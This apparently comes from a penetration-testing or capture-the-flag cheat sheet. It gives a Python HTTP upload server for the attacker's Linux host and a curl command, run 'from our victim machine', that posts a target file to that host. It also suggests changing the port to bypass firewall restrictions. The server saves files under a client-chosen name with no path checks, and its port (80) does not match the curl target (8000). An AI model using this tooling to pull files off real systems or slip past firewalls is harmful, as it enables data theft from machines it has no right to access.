# Upload Server

Use this Python script to UPLOAD any files you want from another machine

Script: (Change port if necessary to bypass firewall restrictions)

    #!/usr/bin/env python3
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import os
    
    class UploadHandler(BaseHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            filename = self.headers.get('X-Filename', 'uploaded_file')
            
            # Read and save the file
            with open(filename, 'wb') as f:
                f.write(self.rfile.read(content_length))
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(f'File {filename} uploaded successfully'.encode())
    
    if __name__ == '__main__':
        server = HTTPServer(('0.0.0.0', 80), UploadHandler)
        print('Upload server running on port 80...')
        server.serve_forever()

Run it:

    python3 uploadserver.py

Then, from our victim machine, we run the command to upload our target file

    curl -X POST -H "X-Filename: myfile.txt" --data-binary "@C:\path\to\file.txt" http://linux-ip:8000
